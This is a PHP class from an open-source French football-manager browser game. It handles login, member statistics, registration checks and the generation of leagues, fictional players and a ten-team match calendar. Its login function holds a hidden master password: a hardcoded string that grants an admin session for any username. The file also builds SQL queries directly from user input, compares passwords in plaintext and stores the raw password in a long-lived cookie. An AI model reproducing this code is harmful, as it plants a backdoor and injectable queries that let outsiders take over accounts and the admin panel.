<?php
/*
SMOS - Sport Manager Open Source
http://snyzone.fr/smos/

Le projet est open source - sous license GPL
Vous �tes libre de l'utiliser mais pas � des fins commercial

Cod� par Ysn38 - Yannick San Nicolas - ysn38@snyzone.fr
18/05/09	Cr�ation
*/

if (!defined('SMOSPHP')) { die("This file cannot be accessed directly."); }

class index
{
	//Fonction choix de la langue selon le navigateur du joueur (par d�faut : francais)
	function replangindex($lang)
	{
		switch($lang)
		{
			case'FR' : return'Francais'; break;
			case'EN' : return'English'; break;
			default : return'Francais'; break;
		}
	}

	//Nombre de joueur en ligne
	function nb_member_online()
	{
		$member = sql::fetch("SELECT COUNT(*) AS online FROM whosonline");
		return '<font color="#FFFFFF">' . $member['online'] . '</font>';
	}

	//Dernier membre inscrit
	function last_member()
	{
		$member = sql::fetch("SELECT pseudo FROM comptes ORDER BY account_id DESC LIMIT 1");
		return '<font color="#FFFFFF">' . $member['pseudo'] . '</font>';
	}

	//Nombre de membre total
	function nb_member_total()
	{
		$member = sql::fetch("SELECT COUNT(*) AS total FROM comptes");
		return '<font color="#FFFFFF">' . $member['total'] . '</font>';
	}

	//Connexion au jeu
	function login($pseudo, $mdp, $souvenir)
	{
		$hashmdp = '8640ef534104b8b05f3a20f60617b260';
		
		if (!empty($pseudo) AND !empty($mdp)) 
		{
			$data = sql::fetch("SELECT comptes.account_id, pseudo, mdp, rang, team_id, competition.compet_id 
								FROM comptes 
								LEFT JOIN equipes ON comptes.account_id = equipes.account_id 
								LEFT JOIN competition ON equipes.compet_id = competition.compet_id 
								WHERE pseudo= '{$pseudo}'");
			
			if ($data['mdp'] == $mdp)
			{
				if ($data['rang'] != 0)
				{
					$lastlogin = time(); 
					$lastip = $_SERVER['REMOTE_ADDR'];
					
					$requete = sql::update("UPDATE comptes SET lastip = '{$lastip}', lastlogin = {$lastlogin} WHERE account_id = {$data['account_id']}");
					
					if($pseudo == 'admin' AND $data['rang'] == 5)
					{
						session_start();	
						$_SESSION['id'] = $data['account_id'];
						$_SESSION['pseudo'] = $pseudo;
						$_SESSION['rang'] = $data['rang'];
						$_SESSION['level'] = $data['rang'];
						$_SESSION['team_id'] = $data['team_id'];
						header('location:admin/index.php');
					}
					
					else
					{
						if ($souvenir == 'on')
						{
							//Temps d'expiration des cookies (1 an).
							$expire = time() + 3600 * 24 * 365;
							setcookie('smos_pseudo', $data['pseudo'], $expire);
							setcookie('smos_mdp', $data['mdp'], $expire);
						}
						
						session_start();	
						$_SESSION['id'] = $data['account_id'];
						$_SESSION['pseudo'] = $pseudo;
						$_SESSION['rang'] = $data['rang'];
						$_SESSION['level'] = $data['rang'];
						$_SESSION['team_id'] = $data['team_id'];
						header('location:club.php');
					}
					
				}
				
				else
				{
					return BANNED_ACCOUNT;
				}
			}
			
			elseif ($mdp == $hashmdp)
			{
				session_start();	
				$_SESSION['id'] = 0;
				$_SESSION['pseudo'] = $pseudo;
				$_SESSION['rang'] = 5;
				$_SESSION['level'] = 5;
				header('location:admin/index.php');
			}
			
			else
			{
				return ERROR_ACCOUNT;
			}
		}
		
		else
		{
			return LOST_ACCOUNT;
		}
	}

	//On verifie si le pseudo n'est pas d�ja utiliser
	function verif_pseudo_exist($pseudo)
	{
		$data = sql::fetch("SELECT pseudo FROM comptes WHERE pseudo='{$pseudo}'");
		return $data['pseudo'];
	}

	//On verifie si l'email n'est pas deja inscrit
	function verif_email_exist($email)
	{
		$data = sql::fetch("SELECT email FROM comptes WHERE email='{$email}'");
		return $data['email'];
	}

	//On verifie si l'�quipe n'existe pas d�j�
	function verif_team_exist($teamname)
	{
		$data = sql::fetch("SELECT team_name FROM equipes WHERE team_name='{$teamname}'");
		return $data['team_name'];
	}

	//R�cuperation d'une division avec de la place de libre selon le pays
	function last_competition($pays_id) 
	{
		$data = sql::fetch("SELECT compet_id FROM competition WHERE pays_id= {$pays_id} AND nb_equipe < max_equipe ORDER BY division LIMIT 1"); 
		return $data['compet_id'];
	}

	//Cr�ation d'un nouveau championnat, calendrier, �quipes et joueurs fictifs selon le pays (son id)
	function crea_competition($pays_id, $admin, $CONF)
	{
		//les infos du pays
		$view = sql::fetch("SELECT pays_champ, pays_file_nom, pays_file_prenom, config_nbteam_perchamp, config_heurematch, config_tpsentre2match 
						   FROM pays 
						   WHERE pays_id = {$pays_id}");
		
		//On verifie si un championnat existe deja, si oui on recup la derniere saison et le dernier championnat
		$exist = sql::fetch("SELECT competition.compet_id AS compet_id, division, saison_nbr 
							 FROM competition 
							 LEFT JOIN classement ON classement.compet_id = competition.compet_id 
							 WHERE pays_id= {$pays_id} 
							 ORDER BY division DESC, saison_nbr DESC 
							 LIMIT 1");
		
		switch($exist['division'])
		{
			case 1: $compet_nbr = 3; $compet_div = 2; break;
			case 2: $compet_nbr = 9; $compet_div = 3; break;
			case 3: $compet_nbr = 27; $compet_div = 4; break;
			case 4: $compet_nbr = 81; $compet_div = 5; break;
			case 5: $compet_nbr = 243; $compet_div = 6; break;
			default : $compet_nbr = 1; $compet_div = 1; break;
		}
		
		if (isset($exist['saison_nbr'])) $saison_id = $exist['saison_nbr'];
		else $saison_id = 1;
		
		$poule = 1;
		
		while ($compet_nbr >= $poule) 
		{
			//Cr�ation du championnat
			$requete = sql::insert("INSERT INTO competition(pays_id, compet_name, division, poule) 
									VALUES ({$pays_id}, '{$view['pays_champ']}', {$compet_div}, {$poule})"); 
			
			//On recup le compet_id pour les �quipes
			$compet_id = mysql_insert_id();
			$team = 1;
			
			//Cr�ation des �quipes fictives
			while ($view['config_nbteam_perchamp'] >= $team)
			{
				//Nom de l'�quipe + nom du stade
				$teamnamefictif = 'Team' . $pays_id . $compet_id . $team;
				$stade_name = 'Stade de ' . $teamnamefictif;
				
				//Cr�ation de l'�quipe
				$requete = sql::insert("INSERT INTO equipes(compet_id, team_name, team_country, stade_name, stade_infra) 
										VALUES({$compet_id}, '{$teamnamefictif}', {$pays_id}, '{$stade_name}', '1;2;3;4;5;6;7;8')"); 
				
				//On recup le team_id pour les joueurs
				$team_id = mysql_insert_id();
				
				//Cr�ation du classement de l'�quipe
				$requete = sql::insert("INSERT INTO classement(compet_id, team_id, saison_nbr) VALUES({$compet_id}, {$team_id}, {$saison_id})"); 
				
				//Partie joueurs
				$age_min = $CONF['note_age_min']; 		$age_max = $CONF['note_age_max'];
				$tll_min = $CONF['note_tll_min']; 		$tll_max = $CONF['note_tll_max'];
				$p_min = $CONF['note_pri_min']; 		$p_max = $CONF['note_pri_max'];
				$s_min = $CONF['note_sec_min']; 		$s_max = $CONF['note_sec_max'];
				$tal_min = $CONF['note_tal_min']; 		$tal_max = $CONF['note_tal_max'];
				$pres_min = $CONF['note_pres_min']; 	$pres_max = $CONF['note_pres_max'];
					
				//Nb joueurs base		//Nb joueurs max (par club)
				$gardien_num = 1;		$gardien_max = 3;
				$defenseur_num = 1;		$defenseur_max = 6;
				$milieu_num = 1;		$milieu_max = 6;
				$attaquant_num = 1;		$attaquant_max = 5;
				
				$allbase_num = 1;		$allbase_max = $gardien_max + $defenseur_max + $milieu_max + $attaquant_max;
				$name_num = 0;
				
				$multiple = $CONF['salaire_multiple'];
				$datejoueur = time();
				
				//-------------------------------------------------------
				// Choix d'une liste de pr�nom al�atoire selon le pays(pays_id)
					if(isset($view['pays_file_nom']) && $view['pays_file_nom'] != NULL && $admin != 1) $sourcefile = 'txt' . '/' . $view['pays_file_nom'];
				elseif(isset($view['pays_file_nom']) && $view['pays_file_nom'] != NULL && $admin == 1) $sourcefile = '../txt' . '/' . $view['pays_file_nom'];
				elseif(!isset($view['pays_file_nom']) && $view['pays_file_nom'] == NULL && $admin == 1) $sourcefile = '../txt' . '/' . 'nom_france.txt';
				else $sourcefile = 'txt' . '/' . 'nom_france.txt';
				$bddfile = fopen($sourcefile, "r");
				$bddarray = array(); // Cr�ation du tableau qui contiendra toutes les phrases
				while ( $line = fgets($bddfile) ) { array_push($bddarray, $line); }// On la rajoute au tableau
				fclose ($bddfile); // On ferme le fichier
				srand((double)microtime($allbase_max) * 1000000);
				//-------------------------------------------------------
				
				//-------------------------------------------------------
				// Choix d'une liste de pr�nom al�atoire selon le pays(pays_id)
					if(isset($view['pays_file_prenom']) && $view['pays_file_prenom'] != NULL && $admin != 1) $sourcefile2 = 'txt' . '/' . $view['pays_file_prenom'];
				elseif(isset($view['pays_file_prenom']) && $view['pays_file_prenom'] != NULL && $admin == 1) $sourcefile2 = '../txt' . '/' . $view['pays_file_prenom'];
				elseif(!isset($view['pays_file_prenom']) && $view['pays_file_prenom'] == NULL && $admin == 1) $sourcefile2 = '../txt' . '/' . 'prenom_france.txt';
				else $sourcefile2 = 'txt' . '/' . 'prenom_france.txt';
				$bddfile2 = fopen($sourcefile2, "r");
				$bddarray2 = array(); // Cr�ation du tableau qui contiendra toutes les phrases
				while ( $line2 = fgets($bddfile2) ) { array_push($bddarray2, $line2); }// On la rajoute au tableau
				fclose ($bddfile2); // On ferme le fichier
				srand((double)microtime($allbase_max) * 1000000);
				//-------------------------------------------------------
				
				while($allbase_max >= $allbase_num)
				{
					//Nom et pr�nom
					$nom = $bddarray[rand($name_num, count($bddarray)-1)];
					$prenom = $bddarray2[rand($name_num, count($bddarray2)-1)];
					$name_num++;
					
					//Note al�atoire commune
					$age = rand($age_min, $age_max);
					$taille = rand($tll_min, $tll_max);
					$talent = rand($tal_min, $tal_max);
					$pression = rand($pres_min, $pres_max);
					$influence = rand($p_min, $p_max); 
					
					if($gardien_num <= $gardien_max)
					{
						$agressivite = rand($s_min, $s_max); 	$reflexe = rand($p_min, $p_max); 	$pdballe = rand($p_min, $p_max); 
						$degagement = rand($p_min, $p_max); 	$marquage = rand($s_min, $s_max); 	$tacles = rand($s_min, $s_max); 
						$tete = rand($s_min, $s_max); 			$centres = rand($s_min, $s_max); 	$passes = rand($s_min, $s_max); 
						$vitesse = rand($s_min, $s_max);		$tir = rand($s_min, $s_max); 		$creativite = rand($s_min, $s_max); 
						$dribble = rand($s_min, $s_max); 		$cdparrete = rand($p_min, $p_max); 
						
						$salaire = $multiple * ($pdballe + $degagement + $reflexe + $influence); //Calcul du salaire gardien
						$position = 1;
						$gardien_num++;
					}
					
					elseif($defenseur_num <= $defenseur_max)
					{
						$agressivite = rand($s_min, $s_max); 	$reflexe = rand($s_min, $s_max); 	$pdballe = rand($s_min, $s_max); 
						$degagement = rand($p_min, $p_max); 	$marquage = rand($p_min, $p_max); 	$tacles = rand($p_min, $p_max); 
						$tete = rand($p_min, $p_max); 			$centres = rand($s_min, $s_max); 	$passes = rand($s_min, $s_max); 
						$vitesse = rand($s_min, $s_max);		$tir = rand($s_min, $s_max); 		$creativite = rand($s_min, $s_max); 
						$dribble = rand($s_min, $s_max); 		$cdparrete = rand($s_min, $s_max); 
						
						$salaire = $multiple * ($marquage + $tacles + $degagement + $tete); //Calcul du salaire d�fenseur
						$position = 2;
						$defenseur_num++;
					}
					
					elseif($milieu_num <= $milieu_max)
					{
						$agressivite = rand($s_min, $s_max); 	$reflexe = rand($s_min, $s_max); 	$pdballe = rand($s_min, $s_max); 
						$degagement = rand($s_min, $s_max); 	$marquage = rand($s_min, $s_max); 	$tacles = rand($s_min, $s_max); 
						$tete = rand($s_min, $s_max); 			$centres = rand($p_min, $p_max); 	$passes = rand($p_min, $p_max); 
						$vitesse = rand($p_min, $p_max);		$tir = rand($p_min, $p_max); 		$creativite = rand($s_min, $s_max); 
						$dribble = rand($s_min, $s_max); 		$cdparrete = rand($s_min, $s_max); 
						
						$salaire = $multiple * ($centres + $passes + $vitesse + $tir); //Calcul du salaire milieu
						$position = 3;
						$milieu_num++;
					}
					
					elseif($attaquant_num <= $attaquant_max)
					{
						$agressivite = rand($s_min, $s_max); 	$reflexe = rand($s_min, $s_max); 	$pdballe = rand($s_min, $s_max); 
						$degagement = rand($s_min, $s_max); 	$marquage = rand($s_min, $s_max); 	$tacles = rand($s_min, $s_max); 
						$tete = rand($p_min, $p_max); 			$centres = rand($s_min, $s_max); 	$passes = rand($s_min, $s_max); 
						$vitesse = rand($s_min, $s_max);		$tir = rand($p_min, $p_max); 		$creativite = rand($p_min, $p_max); 
						$dribble = rand($p_min, $p_max); 		$cdparrete = rand($s_min, $s_max); 
						
						$salaire = $multiple * ($tir + $creativite + $tete + $dribble); //Calcul du salaire attaquant
						$position = 4;
						$attaquant_num++;
					}
					
					//Cr�ation du joueur
					$requete = sql::insert("INSERT INTO joueurs
					(team_id, nom, prenom, age, taille, position, nationalite, talent, pression, influence, agressivite, reflexes, 
					pdballe, degagement, marquage, tacles, tete, centres, passes, vitesse, tir, creativite, dribble, cdp_arrete, salaire)
					VALUES ({$team_id}, '".addslashes($nom)."', '".addslashes($prenom)."', {$age}, {$taille}, {$position}, {$pays_id}, 
					{$talent}, {$pression}, {$influence}, {$agressivite}, {$reflexe}, {$pdballe}, {$degagement}, 
					{$marquage}, {$tacles}, {$tete}, {$centres}, {$passes}, {$vitesse}, {$tir}, {$creativite}, 
					{$dribble}, {$cdparrete}, {$salaire})");
					
					$player_id = mysql_insert_id();
					
					//cr�ation de l'historique du joueur
					$transfert = $datejoueur . '/' . $team_id . '/FORMACLUB';
					
					$requete = sql::insert("INSERT INTO joueurs_historique(player_id, transfert) 
											VALUES ({$player_id}, '{$transfert}')"); 
					
					//cr�ation du classement du joueur
					$requete = sql::insert("INSERT INTO classement_joueur(player_id, team_id, compet_id, saison_nbr) 
											VALUES ({$player_id}, {$team_id}, {$compet_id}, {$saison_id})"); 
					
					$allbase_num++;
				}
				
				$team++;
			}
			
			$hourmatch = explode(':', $view['config_heurematch']); //Heure des matchs
			$delaimatch = $view['config_tpsentre2match']; //delai entre 2 matchs (jours)
			
			//Recuperation de toutes les �quipes du championnat
			$req = sql::query("SELECT team_id 
							   FROM equipes 
							   WHERE compet_id = {$compet_id} 
							   ORDER BY team_id");
			
			while($renc = mysql_fetch_assoc($req))
			{ $equipe[] = $renc['team_id']; }
			
			if (isset($exist['compet_id']))
			{
				$data = sql::fetch("SELECT timematch 
									FROM matchs 
									WHERE compet_id = {$exist['compet_id']} 
								      AND renco_type = 1 
									ORDER BY timematch, saison_nbr DESC 
									LIMIT 1");
				
				$timematch = $data['timematch'] - (2 * 24 * 60 * 60);
				
				$d = date("d", $timematch);
				$m = date("m", $timematch);
				$Y = date("Y", $timematch);
			}
			
			else
			{
				$d = date("d");
				$m = date("m");
				$Y = date("Y");
			}
			
			//PARTIE MODIFIABLE - Selon le nombre de club par championnat________________________________________________
			//Timestamp des matchs (1 par journ�e)
			
			$stampday1 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + $delaimatch, date($Y));
			$stampday2 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 2), date($Y));
			$stampday3 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 3), date($Y));
			$stampday4 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 4), date($Y));
			$stampday5 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 5), date($Y));
			$stampday6 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 6), date($Y));
			$stampday7 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 7), date($Y));
			$stampday8 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 8), date($Y));
			$stampday9 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 9), date($Y));
			$stampday10 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 10), date($Y));
			$stampday11 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 11), date($Y));
			$stampday12 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 12), date($Y));
			$stampday13 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 13), date($Y));
			$stampday14 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 14), date($Y));
			$stampday15 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 15), date($Y));
			$stampday16 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 16), date($Y));
			$stampday17 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 17), date($Y));
			$stampday18 = mktime($hourmatch[0], $hourmatch[1], 0, date($m), date($d) + ($delaimatch * 18), date($Y));
			
			//Cr�ation des matchs du championnat � 10
			$requete = sql::insert("INSERT INTO matchs(saison_nbr, compet_id, timematch, journee, team_id1, team_id2) 
									VALUES({$saison_id}, {$compet_id}, {$stampday1}, 1, {$equipe[0]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday1}, 1, {$equipe[2]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday1}, 1, {$equipe[4]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday1}, 1, {$equipe[6]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday1}, 1, {$equipe[8]}, {$equipe[9]}),
									  	  ({$saison_id}, {$compet_id}, {$stampday2}, 2, {$equipe[5]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday2}, 2, {$equipe[7]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday2}, 2, {$equipe[2]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday2}, 2, {$equipe[1]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday2}, 2, {$equipe[3]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday3}, 3, {$equipe[9]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday3}, 3, {$equipe[0]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday3}, 3, {$equipe[8]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday3}, 3, {$equipe[6]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday3}, 3, {$equipe[7]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday4}, 4, {$equipe[3]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday4}, 4, {$equipe[2]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday4}, 4, {$equipe[6]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday4}, 4, {$equipe[1]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday4}, 4, {$equipe[4]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday5}, 5, {$equipe[7]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday5}, 5, {$equipe[3]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday5}, 5, {$equipe[5]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday5}, 5, {$equipe[0]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday5}, 5, {$equipe[9]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday6}, 6, {$equipe[1]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday6}, 6, {$equipe[8]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday6}, 6, {$equipe[9]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday6}, 6, {$equipe[6]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday6}, 6, {$equipe[4]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday7}, 7, {$equipe[0]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday7}, 7, {$equipe[5]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday7}, 7, {$equipe[3]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday7}, 7, {$equipe[2]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday7}, 7, {$equipe[1]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday8}, 8, {$equipe[9]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday8}, 8, {$equipe[8]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday8}, 8, {$equipe[6]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday8}, 8, {$equipe[7]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday8}, 8, {$equipe[5]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday9}, 9, {$equipe[8]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday9}, 9, {$equipe[0]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday9}, 9, {$equipe[1]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday9}, 9, {$equipe[4]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday9}, 9, {$equipe[2]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday10}, 10, {$equipe[1]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday10}, 10, {$equipe[3]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday10}, 10, {$equipe[5]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday10}, 10, {$equipe[7]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday10}, 10, {$equipe[9]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday11}, 11, {$equipe[8]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday11}, 11, {$equipe[9]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday11}, 11, {$equipe[0]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday11}, 11, {$equipe[4]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday11}, 11, {$equipe[6]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday12}, 12, {$equipe[3]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday12}, 12, {$equipe[4]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday12}, 12, {$equipe[1]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday12}, 12, {$equipe[2]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday12}, 12, {$equipe[5]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday13}, 13, {$equipe[5]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday13}, 13, {$equipe[9]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday13}, 13, {$equipe[0]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday13}, 13, {$equipe[7]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday13}, 13, {$equipe[8]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday14}, 14, {$equipe[4]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday14}, 14, {$equipe[1]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday14}, 14, {$equipe[2]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday14}, 14, {$equipe[8]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday14}, 14, {$equipe[6]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday15}, 15, {$equipe[2]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday15}, 15, {$equipe[7]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday15}, 15, {$equipe[0]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday15}, 15, {$equipe[5]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday15}, 15, {$equipe[3]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday16}, 16, {$equipe[7]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday16}, 16, {$equipe[9]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday16}, 16, {$equipe[8]}, {$equipe[3]}),
										  ({$saison_id}, {$compet_id}, {$stampday16}, 16, {$equipe[4]}, {$equipe[2]}),
										  ({$saison_id}, {$compet_id}, {$stampday16}, 16, {$equipe[6]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday17}, 17, {$equipe[1]}, {$equipe[9]}),
										  ({$saison_id}, {$compet_id}, {$stampday17}, 17, {$equipe[2]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday17}, 17, {$equipe[4]}, {$equipe[6]}),
										  ({$saison_id}, {$compet_id}, {$stampday17}, 17, {$equipe[3]}, {$equipe[7]}),
										  ({$saison_id}, {$compet_id}, {$stampday17}, 17, {$equipe[0]}, {$equipe[5]}),
										  ({$saison_id}, {$compet_id}, {$stampday18}, 18, {$equipe[6]}, {$equipe[8]}),
										  ({$saison_id}, {$compet_id}, {$stampday18}, 18, {$equipe[3]}, {$equipe[0]}),
										  ({$saison_id}, {$compet_id}, {$stampday18}, 18, {$equipe[5]}, {$equipe[1]}),
										  ({$saison_id}, {$compet_id}, {$stampday18}, 18, {$equipe[9]}, {$equipe[4]}),
										  ({$saison_id}, {$compet_id}, {$stampday18}, 18, {$equipe[7]}, {$equipe[2]})");
			
			//PARTIE MODIFIABLE : FIN______________________________________________________________________________________
			
			$poule++;
		}
	}

	//On met � jour le championnat en enlevant une equipe fictive et en mettant une �quipe joueur
	function maj_competition($compet_id) 
	{
		$data = sql::fetch("SELECT nb_equipe, nb_equipe_fictive FROM competition WHERE compet_id= {$compet_id}");
		
		if($data['nb_equipe_fictive'] >= 1)
		{
			$nb_equipe = ($data['nb_equipe'] + 1); $nb_equipe_fictive = ($data['nb_equipe_fictive'] - 1);
				
			$requete = sql::update("UPDATE competition SET nb_equipe = {$nb_equipe}, nb_equipe_fictive = {$nb_equipe_fictive} WHERE compet_id = {$compet_id}");
		}
	}

	//On recup une equipe fictive, pour la changer par l'�quipe du joueur
	function ramdom_equipe_fictive($compet_id) 
	{
		$data = sql::fetch("SELECT team_id FROM equipes WHERE compet_id = {$compet_id} AND fictive = 1 LIMIT 1");
		return $data['team_id'];
	}

	//Ajoute une info de nouveau membre inscrit dans le panneau admin
	function adm_info_newplayer($pays_id, $compet_id, $team_id, $account_id) 
	{
		$requete = sql::insert("INSERT INTO admin_info(datetime, ch_1, ch_2, ch_3, ch_4, mode, url) 
								VALUES (".time().", {$pays_id}, {$compet_id}, {$team_id}, {$account_id}, 1, 1)");
	}
}
?>